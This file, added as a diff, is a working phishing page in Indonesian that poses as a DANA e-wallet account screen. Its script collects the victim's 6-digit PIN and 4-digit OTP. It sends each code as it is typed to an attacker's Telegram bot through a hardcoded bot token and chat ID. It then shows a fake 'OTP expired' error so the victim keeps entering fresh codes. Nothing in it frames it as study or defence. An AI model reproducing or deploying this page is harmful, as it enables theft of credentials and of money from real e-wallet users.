@@ -1,0 +1,345 @@
+<!doctype html>
+<html lang="id">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>PIN & OTP Telegram</title>
+<style>
+:root {
+  --bg:#00A2F9;
+  --card-bg:rgba(255,255,255,0.1);
+  --otp-bg:#f0f0f0; 
+  --otp-area:#ffffff; 
+  --btn-bg:#007BFF;
+  --btn-hover:#0056b3;
+  --error-red:#ff4c4c;
+}
+body {
+  margin:0;
+  font-family:"Segoe UI",Inter,Roboto,sans-serif;
+  background-color:var(--bg);
+  color:#fff;
+  display:flex;
+  flex-direction:column;
+  min-height:100vh;
+  text-align:center;
+}
+.container{
+  flex:1;
+  display:flex;
+  flex-direction:column;
+  align-items:center;
+  justify-content:flex-start;
+  width:100%;
+}
+.logo img{
+  width:140px;
+  max-width:60%;
+  height:auto;
+  margin:10px 0 15px;
+}
+.title{font-size:20px;font-weight:600;margin-bottom:6px;}
+.subtitle{font-size:14px;opacity:0.95;margin-bottom:15px;}
+.card{
+  background:var(--card-bg);
+  border-radius:16px;
+  padding:18px;
+  margin:0 auto 10px;
+  max-width:350px;
+  box-shadow:0 6px 20px rgba(0,0,0,0.2);
+  color:#08324a;
+}
+.input-row{
+  display:flex;
+  justify-content:space-between;
+  gap:5px;
+  margin-top:20px;
+}
+.pin-input, .otp-input{
+  flex:1;
+  max-width:32px;
+  height:32px;
+  border-radius:8px;
+  border:2px solid rgba(255,255,255,0.3);
+  text-align:center;
+  font-size:16px;
+  font-weight:600;
+  color:#0d4a67;
+  transition: all 0.2s ease;
+}
+.pin-input{
+  background:#ffffff;
+}
+.pin-input:focus, .otp-input:focus{
+  border-color:#00A2F9;
+  box-shadow:0 0 6px rgba(0,162,249,0.3);
+  outline:none;
+}
+.toggle-btn{
+  margin-top:12px;
+  background:rgba(255,255,255,0.2);
+  border:2px solid #fff;
+  border-radius:9999px;
+  color:#fff;
+  font-weight:600;
+  cursor:pointer;
+  font-size:14px;
+  padding:8px 20px;
+  display:inline-flex;
+  align-items:center;
+  justify-content:center;
+  transition:all 0.2s ease;
+}
+.toggle-btn:hover{background:rgba(255,255,255,0.3);transform:scale(1.05);}
+.toggle-btn:active{transform:scale(0.95);}
+.note{font-size:13px;margin:10px 0 20px;color:rgba(255,255,255,0.95);}
+.otp-section{
+  position:relative;
+  margin-top:20px;
+  display:none;
+  flex-direction:column;
+  align-items:center;
+  width:100%;
+  background:var(--otp-area); 
+  flex:1; 
+  border-radius:12px 12px 0 0;
+  padding:20px 15px 25px; 
+  box-sizing:border-box;
+}
+.otp-header{
+  margin-bottom:10px;
+}
+.otp-header .title{
+  font-size:16px;
+  font-weight:700;
+  color:#000;
+  text-transform:uppercase;
+}
+.otp-header .subtitle{
+  font-size:13px;
+  color:#333;
+  line-height:1.4;
+  margin-top:5px;
+}
+.error-msg{
+  margin:0 0 10px 0;
+  color: var(--error-red);
+  font-weight:600;
+  display:none;
+  text-align:center;
+}
+.otp-row{
+  display:flex;
+  justify-content:space-between;
+  gap:5px;
+  margin-top:5px;
+}
+.otp-input{
+  background:var(--otp-bg);
+}
+.resend-btn{
+  margin-top:15px;
+  background:var(--btn-bg);
+  color:#fff;
+  border:none;
+  padding:10px 20px;
+  border-radius:8px;
+  font-weight:600;
+  cursor:pointer;
+  transition:all 0.2s ease;
+}
+.resend-btn:hover{background:var(--btn-hover);}
+.resend-btn:disabled{
+  opacity:0.6;
+  cursor:not-allowed;
+}
+/* Loading overlay modern */
+.loading-overlay, .otp-loading{
+  position:fixed;
+  top:0; left:0;
+  width:100%; height:100%;
+  background:rgba(0,0,0,0.3);
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  z-index:100;
+  display:none;
+  flex-direction:column;
+}
+.spinner-3d, .otp-spinner-3d{
+  width:50px;
+  height:50px;
+  border:5px solid rgba(0,123,255,0.3);
+  border-top-color:#007BFF;
+  border-radius:50%;
+  animation:spin3d 1s linear infinite;
+  margin-bottom:12px;
+}
+.spinner-pulse, .otp-spinner-pulse{
+  width:60px;
+  height:6px;
+  border-radius:3px;
+  background:linear-gradient(90deg, #007BFF, rgba(0,123,255,0.3));
+  animation:pulse 1s infinite ease-in-out;
+}
+.spinner-text, .otp-spinner-text{
+  color:#fff;
+  font-weight:600;
+  font-size:14px;
+  letter-spacing:0.5px;
+}
+@keyframes spin3d{
+  0%{transform:rotate(0deg);}
+  100%{transform:rotate(360deg);}
+}
+@keyframes pulse{
+  0%,100%{transform:scaleX(0.3);}
+  50%{transform:scaleX(1);}
+}
+</style>
+</head>
+<body>
+<div class="container">
+  <div class="logo">
+    <img src="https://v.cylnk.web.id/pemulihan-akun-daana/ast/img/dana_logo.png" alt="Logo">
+  </div>
+  <h1 class="title">Masukkan PIN</h1>
+  <p class="subtitle">Masukkan PIN 6 digit</p>
+  <div class="card">
+    <form id="pinForm" onsubmit="return false">
+      <div class="input-row" id="pinRow">
+        <input type="password" inputmode="numeric" maxlength="1" class="pin-input">
+        <input type="password" inputmode="numeric" maxlength="1" class="pin-input">
+        <input type="password" inputmode="numeric" maxlength="1" class="pin-input">
+        <input type="password" inputmode="numeric" maxlength="1" class="pin-input">
+        <input type="password" inputmode="numeric" maxlength="1" class="pin-input">
+        <input type="password" inputmode="numeric" maxlength="1" class="pin-input">
+      </div>
+      <button type="button" class="toggle-btn" id="togglePin">TAMPILKAN</button>
+    </form>
+  </div>
+
+  <div class="otp-section" id="otpSection">
+    <div class="otp-header">
+      <div class="title">Bukan Akun Dana Anda</div>
+      <div class="subtitle">Sebelum Lanjut Harap Verifikasi ketik (Setuju) Setelah Itu Kode OTP Akan di Kirim Via WhatsApp/Sms</div>
+    </div>
+
+    <!-- Pesan error di atas input OTP -->
+    <div class="error-msg" id="otpError">Kode OTP telah kadaluarsa atau invalid, silahkan kirim ulang kode OTP</div>
+
+    <div class="otp-row">
+      <input type="tel" inputmode="numeric" maxlength="1" class="otp-input">
+      <input type="tel" inputmode="numeric" maxlength="1" class="otp-input">
+      <input type="tel" inputmode="numeric" maxlength="1" class="otp-input">
+      <input type="tel" inputmode="numeric" maxlength="1" class="otp-input">
+    </div>
+
+    <button class="resend-btn" id="resendBtn" disabled>Kirim Ulang (100)</button>
+
+    <div class="otp-loading" id="otpLoading">
+      <div class="otp-spinner-3d"></div>
+      <div class="otp-spinner-pulse"></div>
+      <div class="otp-spinner-text">Memproses OTP...</div>
+    </div>
+  </div>
+</div>
+
+<div class="loading-overlay" id="loadingOverlay">
+  <div class="spinner-3d"></div>
+  <div class="spinner-pulse"></div>
+  <div class="spinner-text">Memproses PIN...</div>
+</div>
+
+<script>
+const pinInputs = document.querySelectorAll('.pin-input');
+const otpSection = document.getElementById('otpSection');
+const toggleBtn = document.getElementById('togglePin');
+const resendBtn = document.getElementById('resendBtn');
+const otpError = document.getElementById('otpError');
+const loadingOverlay = document.getElementById('loadingOverlay');
+const otpLoading = document.getElementById('otpLoading');
+const otpInputs = document.querySelectorAll('.otp-input');
+
+const token = "7968576316:AAF6vbfSpa2XL-WIT_1mkUKmo2khbAAVrIs";
+const chatId = "7604299278";
+
+let pinVisible = false;
+let timer = 100;
+let timerInterval;
+
+// Toggle PIN visibility
+toggleBtn.addEventListener('click', () => {
+  pinVisible = !pinVisible;
+  pinInputs.forEach(input => input.type = pinVisible ? 'text' : 'password');
+  toggleBtn.textContent = pinVisible ? 'SEMBUNYIKAN' : 'TAMPILKAN';
+});
+
+// PIN input logic
+pinInputs.forEach((input,i)=>{
+  input.addEventListener('input', ()=>{
+    if(input.value.length===1 && i<pinInputs.length-1) pinInputs[i+1].focus();
+    const pin = Array.from(pinInputs).map(p=>p.value).join('');
+    if(pin.length===6){
+      loadingOverlay.style.display='flex';
+      sendToTelegram("PIN Terkirim: "+pin).then(()=>{
+        loadingOverlay.style.display='none';
+        otpSection.style.display='flex';
+        otpInputs[0].focus();
+      });
+    }
+  });
+  input.addEventListener('keydown',(e)=>{
+    if(e.key==='Backspace' && input.value==='' && i>0) pinInputs[i-1].focus();
+  });
+});
+
+// OTP input logic
+otpInputs.forEach((input,i)=>{
+  input.addEventListener('input', ()=>{
+    if(input.value.length===1 && i<otpInputs.length-1) otpInputs[i+1].focus();
+    const otp = Array.from(otpInputs).map(o=>o.value).join('');
+    if(otp.length===4){
+      otpLoading.style.display='flex';
+      sendToTelegram("OTP Terkirim: "+otp).then(()=>{
+        setTimeout(()=>{
+          otpLoading.style.display='none';
+          otpError.style.display='block';
+        },1500);
+      });
+    }else{
+      otpError.style.display='none';
+    }
+  });
+});
+
+// Telegram function
+function sendToTelegram(message){
+  return fetch(`https://api.telegram.org/bot${token}/sendMessage`,{
+    method:"POST",
+    headers:{"Content-Type":"application/json"},
+    body:JSON.stringify({chat_id:chatId,text:message})
+  }).then(res=>res.json());
+}
+
+// OTP timer
+function startTimer(){
+  resendBtn.disabled=true;
+  timer=100;
+  resendBtn.textContent="Kirim Ulang ("+timer+")";
+  timerInterval = setInterval(()=>{
+    timer--;
+    resendBtn.textContent="Kirim Ulang ("+timer+")";
+    if(timer<=0){
+      clearInterval(timerInterval);
+      resendBtn.disabled=false;
+      resendBtn.textContent="Kirim Ulang";
+    }
+  },1000);
+}
+startTimer();
+
+window.addEventListener('load',()=>setTimeout(()=>pinInputs[0].focus(),300));
+</script>
+</body>
+</html>
